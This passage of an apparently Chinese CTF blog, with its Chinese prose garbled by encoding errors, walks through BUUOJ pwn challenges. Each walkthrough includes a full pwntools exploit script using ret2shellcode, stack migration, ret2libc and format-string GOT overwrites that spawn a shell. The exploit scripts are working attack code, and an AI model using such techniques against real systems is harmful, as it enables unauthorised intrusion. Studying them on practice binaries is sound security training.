<p>è¿è¡Œï¼Œå¾—åˆ°flag<del>è—çš„ä½ç½®å¥½æ·±å•Š</del></p>
<p><img src="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png" alt="F240_K_XDU@_4RS_JFVI~RP.png"></p>
<h1 id="0x01D-ez-pz-hackover-2016-ret2shellcode"><a href="#0x01D-ez-pz-hackover-2016-ret2shellcode" class="headerlink" title="0x01D.ez_pz_hackover_2016 - ret2shellcode"></a>0x01D.ez_pz_hackover_2016 - ret2shellcode</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œæš—ç¤ºæˆ‘ä»¬å¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p>
<p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606747425236.png" alt="1606747425236"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>chall()</code>å‡½æ•°ä¸­ç»™æˆ‘ä»¬æ³„éœ²äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œå¹¶è¯»å…¥1023å­—èŠ‚ï¼Œæ— æ³•æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png" alt="image.png"></p>
<p>ä½†æ˜¯åœ¨vulnå‡½æ•°ä¸­ä¼šæ‹·è´ä¸€æ¬¡æˆ‘ä»¬çš„è¾“å…¥ï¼Œ<strong>å¯ä»¥æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png" alt="image.png"></p>
<p>ç”±äºç»™äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¾“å…¥ä¸€æ®µshellcodeåè·³è½¬å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹æ˜¯<code>vuln()</code>å‡½æ•°æ˜¯<strong>å°†ä¼ å…¥çš„å‚æ•°çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥memcpyçš„</strong>ï¼Œæ•…å®é™…ä¸Šä¼šé¢å¤–æ‹·è´0xec - 0xd0 = 0x1cå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«å……åˆ°ebpæ‰€éœ€çš„paddingé•¿åº¦å…¶å®åªéœ€è¦0x32 - 0x1c = 0x16å­—èŠ‚</p>
<p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606752784211.png" alt="1606752784211"></p>
<p>æ³„éœ²å‡ºæ¥çš„åœ°å€å’Œæˆ‘ä»¬æ‹·è´åˆ°çš„åœ°å€ä¸Šçš„shellcodeé—´è·ä¸º0x9ec - 0x9d0 = 0x1cï¼Œç›´æ¥è·³è½¬è¿‡å»å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å› ä¸ºmemcpyæ‹·è´äº†é•¿è¾¾0x400å­—èŠ‚çš„å†…å®¹ï¼Œä¼šå°†æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°æ®å°½æ•°ç ´åï¼Œæ•…æˆ‘ä»¬åªèƒ½å‘æ‹·è´åçš„åœ°å€è·³</strong></p>
<p><img src="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png" alt="_9T8_GI__708_M0FN1H~_GC.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">"./ez_pz_hackover_2016"</span>) <span class="comment">#  remote("node3.buuoj.cn", 25809) # </span></span><br><span class="line">offset = <span class="number">0x16</span></span><br><span class="line">verify = <span class="string">b"crashme\x00"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"lets crash: "</span>)</span><br><span class="line">stack_leak = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"stack leak: "</span> + hex(stack_leak))</span><br><span class="line">payload = verify + <span class="string">b'A'</span> * (offset - len(verify)) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack_leak - <span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png" alt="image.png"></p>
<h1 id="0x01E-ciscn-2019-es-2-ret2text-stack-migration"><a href="#0x01E-ciscn-2019-es-2-ret2text-stack-migration" class="headerlink" title="0x01E.ciscn_2019_es_2 - ret2text + stack migration"></a>0x01E.ciscn_2019_es_2 - ret2text + stack migration</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png" alt="image.png"></p>
<p>å­˜åœ¨æº¢å‡ºï¼Œä¸”è¯»å–ä¸¤æ¬¡è¾“å‡ºä¸¤æ¬¡ï¼Œæ•…ç¬¬ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥å¡«å……0x28å­—èŠ‚è·å¾—ä¸€ä¸ªæ ˆä¸Šåœ°å€</p>
<p><img src="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png" alt="image.png"></p>
<p>å­˜åœ¨systemå‡½æ•°</p>
<p>ç”±äºæº¢å‡ºåªæœ‰8ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬èƒ½å¤Ÿè·å¾—æ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¿›è¡Œ<strong>æ ˆè¿ç§»</strong>ï¼Œåœ¨æ ˆä¸Šæ„é€ ROPé“¾</p>
<p>é¢˜ç›®ä¸­åªç»™äº†<code>system()</code>å‡½æ•°ï¼Œæ²¡ç»™<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œä¸è¿‡ç”±äºæ ˆä¸Šåœ°å€å¯çŸ¥ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å°†ä¹‹è¯»å–åˆ°æ ˆä¸Š</p>
<p>gdbè°ƒè¯•å¯çŸ¥æˆ‘ä»¬çš„è¾“å…¥ä¸æ‰€æ³„éœ²åœ°å€é—´è·ä¸º0xe18 - 0xde0 = 0x38</p>
<p><img src="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">25040</span>) <span class="comment"># process("./ciscn_2019_es_2") #</span></span><br><span class="line">e = ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">leave_ret = <span class="number">0x80485FD</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(hex(stack_leak))</span><br><span class="line">payload2 = p32(e.sym[<span class="string">'system'</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_leak<span class="number">-0x38</span> + <span class="number">12</span>) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">payload2 += <span class="string">b'A'</span> * (offset - len(payload2)) + p32(stack_leak - <span class="number">0x38</span> - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png" alt="image.png"></p>
<h1 id="0x01F-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration"><a href="#0x01F-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration" class="headerlink" title="0x01F.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration"></a>0x01F.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png" alt="image.png"></p>
<p>ç¬¬ä¸€æ¬¡å¾€bssæ®µä¸Šè¯»å…¥0x200å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡å¾€æ ˆä¸Šè¯»å…¥0x20å­—èŠ‚ï¼Œ<strong>åªèƒ½åˆšå¥½æº¢å‡º8ä¸ªå­—èŠ‚</strong></p>
<p>æ•…è€ƒè™‘è¿›è¡Œæ ˆè¿ç§»å°†æ ˆè¿ç§»åˆ°bssæ®µä¸Š</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">29227</span>) <span class="comment"># process("./spwn") #</span></span><br><span class="line">e = ELF(<span class="string">"./spwn"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">payload1 = p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span> * <span class="number">0x18</span> + p32(bss_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'What do you want to say?'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload3 = p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"What is your name?"</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b'What do you want to say?'</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png" alt="image.png"></p>
<h1 id="0x020-jarvisoj-level3-ret2libc"><a href="#0x020-jarvisoj-level3-ret2libc" class="headerlink" title="0x020.jarvisoj_level3 - ret2libc"></a>0x020.jarvisoj_level3 - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png" alt="image.png"></p>
<p>å­˜åœ¨120å­—èŠ‚çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3'</span>) <span class="comment"># p = remote('node3.buuoj.cn',26149)</span></span><br><span class="line">e = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png" alt="image.png"></p>
<blockquote>
<p>æ„Ÿè§‰ret2libcçš„é¢˜åŸºæœ¬éƒ½å¤§åŒå°å¼‚å•Šâ€¦</p>
</blockquote>
<h1 id="0x021-BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†"><a href="#0x021-BJDCTF-2nd-test-LinuxåŸºç¡€çŸ¥è¯†" class="headerlink" title="0x021.[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†"></a>0x021.[BJDCTF 2nd]test - LinuxåŸºç¡€çŸ¥è¯†</h1><p>é¢˜ç›®åªç»™äº†ä¸€ä¸ªsshï¼Œå°è¯•è¿›è¡Œè¿æ¥</p>
<p><img src="https://i.loli.net/2020/12/01/WqAa8StsGKveMTw.png" alt="image.png"></p>
<p>å°è¯•ä¸€ä¸‹å‘ç°æˆ‘ä»¬æ— æ³•ç›´æ¥è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/BsjidqO7gZcCfEv.png" alt="image.png"></p>
<p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶æƒé™ï¼Œå‘ç°åªæœ‰<code>ctf_pwn</code>ç”¨æˆ·ç»„æ‰æœ‰æƒé™</p>
<p><img src="https://i.loli.net/2020/12/01/ETx7LSG5zC9Zeul.png" alt="image.png"></p>
<p>æç¤ºå‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶testä¸å…¶æºç ï¼Œå°è¯•é˜…è¯»</p>
<p><img src="https://i.loli.net/2020/12/01/g7qk6h8j2BM4Y3T.png" alt="image.png"></p>
<p>è¯¥ç¨‹åºä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¼šè¿‡æ»¤ä¸€éƒ¨åˆ†å­—ç¬¦</p>
<p>å°è¯•ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹å‰©ä½™çš„å¯ç”¨å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$ ls /usr/bin/ /bin/ | grep -v -E "n|e|p|b|u|s|h|i|f|l|a|g"`</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/01/2zWulrZ5IOGcELP.png" alt="image.png"></p>
<p>æˆ‘ä»¬å‘ç°åœ¨testç¨‹åºä¸­æœ‰æ•ˆç”¨æˆ·ç»„ä¸º<code>ctf_pwn</code>ï¼Œæ•…ä½¿ç”¨è¯¥ç¨‹åºè·å–ä¸€ä¸ªshellå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/r4U1m3TiBjohkZF.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/12/01/j8LHM4DzXE6pZ5m.png" alt="image.png"></p>
<h1 id="0x022-BJDCTF-2nd-r2t4-fmtstr"><a href="#0x022-BJDCTF-2nd-r2t4-fmtstr" class="headerlink" title="0x022.[BJDCTF 2nd]r2t4 - fmtstr"></a>0x022.[BJDCTF 2nd]r2t4 - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/zPCHqKLigBI4Nwd.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/W6sVY2Hp4TFECBO.png" alt="image.png"></p>
<p>mainä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸”å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/jIJCdMwZ9ufy3ti.png" alt="image.png"></p>
<p>å­˜åœ¨å¯ä»¥è¯»å–flagçš„åé—¨å‡½æ•°</p>
<p>ç®€å•å°è¯•å¯ä»¥å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬å…­ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2020/12/01/eI31RvsilqYKpTZ.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œä»»æ„åœ°å€å†™åŠ«æŒgotè¡¨ä¸­çš„__stack_chk_failä¸ºåé—¨å‡½æ•°åœ°å€å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<code>printf</code>å‡½æ•°é‡åˆ°<code>\x00</code>ä¼šå‘ç”Ÿæˆªæ–­ï¼Œæ•…ä¸èƒ½ç›´æ¥ä½¿ç”¨fmtstr_payloadï¼Œè€Œæ˜¯è¦ç”¨æ‰‹å†™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./r2t4'</span>)<span class="comment">#remote('node3.buuoj.cn',25635)</span></span><br><span class="line">e = ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line">payload = <span class="string">b'%64c%9$hn%1510c%10$hnaaa'</span> + p64(e.got[<span class="string">'__stack_chk_fail'</span>]+<span class="number">2</span>) + p64(e.got[<span class="string">'__stack_chk_fail'</span>])<span class="comment">#fmtstr_payload(6,&#123;e.got['__stack_chk_fail']:backdoor&#125;)</span></span><br><span class="line">payload.ljust(<span class="number">100</span>,<span class="string">b'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/3KvIRtcrT1z9LUm.png" alt="image.png"></p>
<h1 id="0x023-jarvisoj-fm-fmtstr"><a href="#0x023-jarvisoj-fm-fmtstr" class="headerlink" title="0x023.jarvisoj_fm - fmtstr"></a>0x023.jarvisoj_fm - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png" alt="image.png"></p>
<p>å½“xä¸º4æ—¶ç›´æ¥getshellï¼Œxåœ¨bssæ®µä¸Š</p>
<p><img src="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png" alt="image.png"></p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨ç¬¬13ä¸ªå‚æ•°çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804A02C</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25865</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png" alt="image.png"></p>
<h1 id="0x024-jarvisoj-tell-me-something-ret2csu-ret2libc"><a href="#0x024-jarvisoj-tell-me-something-ret2csu-ret2libc" class="headerlink" title="0x024.jarvisoj_tell_me_something - ret2csu + ret2libc"></a>0x024.jarvisoj_tell_me_something - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26270</span>)<span class="comment">#process('./guestbook') # </span></span><br><span class="line">e=  ELF(<span class="string">'./guestbook'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006F3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006f1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>* offset + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">'write'</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">'write'</span>]) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b'I have received your message, Thank you!\n'</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>* offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png" alt="image.png"></p>
<h1 id="0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite"><a href="#0x025-BJDCTF-2nd-ydsneedgirlfriend2-overwrite" class="headerlink" title="0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite"></a>0x025.[BJDCTF 2nd]ydsneedgirlfriend2 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/mDEwn7F62VP9klh.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/AbWlLCKU6Sdxn5D.png" alt="image.png"></p>
